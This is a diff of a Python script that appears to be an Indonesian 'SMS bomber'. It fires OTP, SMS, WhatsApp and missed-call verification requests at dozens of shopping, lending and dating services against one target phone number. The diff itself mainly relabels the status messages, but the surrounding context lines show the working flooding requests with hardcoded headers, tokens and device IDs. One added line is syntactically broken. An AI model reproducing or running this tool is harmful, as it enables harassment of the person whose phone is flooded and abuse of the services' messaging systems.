@@ -23,7 +23,7 @@ def main():
 def logo():
   print """%s
 ________                     _________
-|    ____|                   |   ____/○
+|    ____|                   |   ____/
 |   |_____ ________________  |   |______ __ _________
 |    ___| ' __|  ___|  ___|  |    ___|  |  '__|  ___|
 |   |   |  |  |  __|   __|   |   |   |  |  |  |  __|
@@ -63,9 +63,9 @@ def sunchila():
 def nutriclub():
   h = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
   if json.loads(h.text)["StatusMessage"] == 'Request misscall berhasil':
-   sukses("3","call","nutriclub")
+   sukses("3","bocil call","nutriclub")
   else:
-   gagal("3","call","nutriclub")
+   gagal("3","bocil call","nutriclub")
 def asani():
   j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+nom,"email":"akuntesnuyul@gmail.com"}))
   if json.loads(j.text)["message"] == 'OTP Terkirim ':
@@ -78,7 +78,7 @@ def wintershop():
 # if json.loads(tes.text)["message"] == None:
  sukses("5","call","wintershop")
  #else:
-  #gagal("5","call","wintershop")
+  #gagal("5","bocil call","wintershop")
 def datesy():
 # to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
  #if json.loads(to.text)["success"] == True:
@@ -88,22 +88,22 @@ def datesy():
 def thaifriendly():
  tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
  if json.loads(tes.text)["success"] == True:
-  sukses("7","sms","thaifriendly")
+  sukses("7","bocil sms","thaifriendly")
  else:
-  gagal("7","sms","thaifriendly")
+  gagal("7","bocil sms","thaifriendly")
 def jumpstart():
  dat=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+62"+nom},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"})
  tes=requests.post("https://api.jumpstart.id/graphql",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'},data=dat)
  if json.loads(tes.text)["data"] == None:
-  gagal("8","sms","jumpstart")
+  gagal("8","bocil sms","jumpstart")
  else:
-  sukses("8","sms","jumpstart")
+  sukses("8","bocil sms","jumpstart")
 def kinimart():
 # tem = requests.post("https://kinimart.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
  #if json.loads(tem.text)["IsSuccess"] == True:
-  sukses("9","wa","kinimart")
+  sukses("9","bocil wa","kinimart")
  #else:
- # gagal("9","wa","kinimart")
+ # gagal("9","bocil wa","kinimart")
 def klikwa():
  dat=json.dumps({"number":"+62"+nom})
  tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Authorization':'Basic QjMzOkZSMzM='},data=dat)
@@ -114,28 +114,28 @@ def klikwa():
 def bakmikeraton():
 # huh = requests.post("https://www.bakmikeraton.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
  #if json.loads(huh.text)["IsSuccess"] == True:
-  sukses("11","wa","bakmikeraton")
+  sukses("11","bocil wa","bakmikeraton")
  #else:
-  #gagal("11","wa","bakmikeraton")
+  #gagal("11","bocil wa","bakmikeraton")
 def kopidulukala():
  #huh = requests.post("https://kopidulukala.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
  #if json.loads(huh.text)["IsSuccess"] == True:
-  sukses("12","wa","kopidulukala")
+  sukses("12","bocil wa","kopidulukala")
  #else:
-  #gagal("12","wa","kopidulukala")
+  #gagal("12","bocil wa","kopidulukala")
 def kredinesia():
  dat = '{"code":0,"distinctId":"df857a37-421b-4a4f-ac61-6ed0e272537b","frequency":0,"phone":"%s"}'%nom
  hu = requests.post("https://api.kartuserba.com/appserver/v1/login/verificationCode",headers={'user-agent':'okhttp/3.11.0','content-type':'application/json; charset=UTF-8','channel-key':'GOOGLEPLAY'},data=dat)
  if json.loads(hu.text)["errorCode"] == None:
-  sukses("13","sms","kredinesia")
+  sukses("13","bocil sms","kredinesia")
  else:
-  gagal("13","sms","kredinesia")
+  gagal("13","bocil sms","kredinesia")
 def pinjamindo():
  hu = requests.get("https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"%nom)
  if json.loads(hu.text)["msg"] == 'success':
-  sukses("14","sms","pinjamindo")
+  sukses("14","bocil sms","pinjamindo")
  else:
-  gagal("14","sms","pinjamindo")
+  gagal("14",sbocil sms","pinjamindo")
 def uangpintar():
  hd={
 'Host':'www.uangpintar.id:7092',
@@ -158,16 +158,16 @@ def uangpintar():
  }
  pis=requests.post("http://www.uangpintar.id:7092/up/sms_login/vcode",headers=hd,data={'phone':nom,'code':'62'})
  if json.loads(pis.text)["desc"] == 'Success':
-  sukses("15","sms","uangpintar")
+  sukses("15","bocil sms","uangpintar")
  else:
-  gagal("15","sms","uangpintar")
+  gagal("15","bocil sms","uangpintar")
 def danafix():
 # dat='{"client_id":"0%s","guid":"dcd0b4e8-c9f7-4fe2-b66b-5e022a14acb8","type":"new","otp_via_zalo":false}'%nom
  #eem = requests.post("https://api.danafix.id/mob/client/verification/send",headers={'user-agent':'okhttp/4.2.0'},data=dat).text
  #if json.loads(eem)["success"] == True:
-  sukses("16","sms","danafix")
+  sukses("16","bocil sms","danafix")
  #else:
-  #gagal("16","sms","danafix")
+  #gagal("16","bocil sms","danafix")
 def maucash():
  hd={
 'Host':'japi.maucash.id',
@@ -182,28 +182,28 @@ def maucash():
  }
  hu = requests.get("https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=%s&channelType=0"%nom,headers=hd)
  if json.loads(hu.text)["message"] == 'Permintaan berhasil':
-  sukses("17","sms","maucash")
+  sukses("17","bocil sms","maucash")
  else:
-  gagal("17","sms","maucash")
+  gagal("17","bocil sms","maucash")
 def omamoriexpress():
  huh = requests.post("https://omamoriexpress.isellershop.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'destination':'0'+nom,'otpLength':'6'})
  if json.loads(huh.text)["IsSuccess"] == True:
-  sukses("18","wa","omamoriexpress")
+  sukses("18","bocil wa","omamoriexpress")
  else:
-  gagal("18","wa","omamoriexpress")
+  gagal("18","bocil wa","omamoriexpress")
 def ktakilat():
  tu = requests.post("https://battlefront.danacepat.com/v1/auth/common/phone/send-code",headers={'user-agent':'Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50'},data={'mobile_no':nom})
  if json.loads(tu.text)["message"] == 'success':
-  sukses("19","sms","ktakilat")
+  sukses("19","bocil sms","ktakilat")
  else:
-  gagal("19","sms","ktakilat")
+  gagal("19","bocil sms","ktakilat")
 def cairin():
  data={'haveImageCode':'0','fileName':'6f8c3b90c845f09ff1bfe714a30aede8','phone':'0'+nom,'imageCode':'','userImei':'','type':'registry'}
  hua = requests.post("https://app.cairin.id/v1/app/sms/sendCaptcha",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36'},data=data).text
  if json.loads(hua)["code"] == '0':
-  sukses("20","sms","cairin")
+  sukses("20","bocil sms","cairin")
  else:
-  gagal("20","sms","cairin")
+  gagal("20","bocil sms","cairin")
 def kredito():
  dat='{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'%nom
  hd={
@@ -219,9 +219,9 @@ def kredito():
  }
  hy=requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send",headers=hd,data=dat).text
  if json.loads(hy)["msg"] == 'sukses':
-  sukses("21","sms","kredito")
+  sukses("21","bocil sms","kredito")
  else:
-  gagal("21","sms","kredito")
+  gagal("21","bocil sms","kredito")
 def kreditpedia():
  hd={
 'Host':'www.kreditpedia.co.id:8089',
@@ -244,9 +244,9 @@ def kreditpedia():
  }
  #hu=requests.post("https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode",headers=hd,data={'phone':nom,'code':'62'})
 # if json.loads(hu.text)["desc"] == 'Success':
- sukses("22","sms","kreditpedia")
+ sukses("22","bocil sms","kreditpedia")
 # else:
- # gagal("22","sms","kreditpedia")
+ # gagal("22","bocil sms","kreditpedia")
 def bocil():
  dat={'user_id':'','language':'in','phone':'62'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
  uh = requests.post("https://bocil.id/mobile/v1/miscallotp_request.php",headers={'user-agent':'okhttp/3.10.0'},data=dat).text
@@ -256,20 +256,20 @@ def bocil():
   gagal("23","call","bocil")
 def duitqu():
  tes = requests.get("https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=ccvIIClr0Sw&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10102&sign=1B8BE88D093027E0CD9970C48DCA3F86EDE31C08"%nom)
- sukses("24","sms","duiqu")
+ sukses("24","bocil sms","duiqu")
 def primacash():
 # uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'62'+nom})).text
 # if json.loads(uhu)["success"] == True:
-  sukses("25","sms","primacash")
+  sukses("25","bocil sms","primacash")
  #else:
-  #gagal("26","sms","primacash")
+  #gagal("26","bocil sms","primacash")
 def temanprima():
 # dat=json.dumps({"phone":"62"+nom,"place":"google","phone_brand":"vivo","phone_model":"vivo 1902","device_id":"590bc36d99d6dddb"})
  #hpo = requests.post("https://pro.temanprima.co.id/teman_prima/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=dat).text
  #if json.loads(hpo)["success"] == True:
-  sukses("28","sms","temanprima")
+  sukses("28","bocil sms","temanprima")
  #else:
-  #gagal("28","sms","temanprima")
+  #gagal("28","bocil sms","temanprima")
 def maripinjam():
  hd={
 'Host':'api.guntur.top',
@@ -289,15 +289,15 @@ def maripinjam():
  }
  #ijo=requests.get("https://api.guntur.top/a0jm6akw/hvfgpv71/wzq12mqh/"+nom+"/2",headers=hd).text
  #if json.loads(ijo)["success"] == True:
- sukses("29","sms","maripinjam")
+ sukses("29","bocil sms","maripinjam")
  #else:
-  #gagal("29","sms","maripinjam")
+  #gagal("29","bocil sms","maripinjam")
 def sobatbangun():
 # h = json.loads(requests.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=0%s"%nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
  #if h["status"] == 'success':
-  sukses("30","wa","sobatbangun")
+  sukses("30","bocil wa","sobatbangun")
  #else:
-  #gagal("30","wa","sobatbangun")
+  #gagal("30","bocil wa","sobatbangun")
 
 
 if __name__ == '__main__':
